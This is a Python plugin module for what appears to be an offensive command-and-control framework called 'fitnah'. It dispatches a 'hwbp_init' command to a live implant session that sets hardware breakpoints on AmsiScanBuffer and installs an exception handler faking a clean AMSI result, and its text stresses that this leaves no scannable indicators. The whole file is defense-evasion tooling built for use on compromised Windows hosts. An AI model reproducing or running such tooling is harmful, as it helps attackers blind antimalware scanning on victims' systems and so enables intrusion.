"""defense_evasion/amsi_bypass — hardware breakpoint AMSI bypass via implant HwBpBypassInit(). MITRE T1562.001

Triggers the implant's HwBpBypassInit() which places a hardware debug register (Dr0)
on AmsiScanBuffer entry point and installs a VEH that fakes AMSI_RESULT_CLEAN.
No byte patches — zero scannable IOC in amsi.dll. Memory scanners see original bytes.
"""
from fitnah.sdk import BasePlugin, ModuleResult, ParamSchema, mitre


class AmsiBypass(BasePlugin):
    NAME        = "amsi_bypass"
    DESCRIPTION = "Install hardware breakpoint AMSI bypass (Dr0 on AmsiScanBuffer, VEH). No byte patches."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1562.001"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema()

    @mitre("T1562.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        # Dispatch "hwbp_init" — calls HwBpBypassInit() in implant, installs Dr0-Dr2 + VEH
        r = ctx.send("hwbp_init", {})
        if r["status"] != "ok":
            return ModuleResult.err(f"hwbp_init failed: {r['output']}")
        return ModuleResult.ok(data="Hardware breakpoint AMSI/ETW bypass installed (Dr0-Dr2 + VEH). Zero byte IOC.")
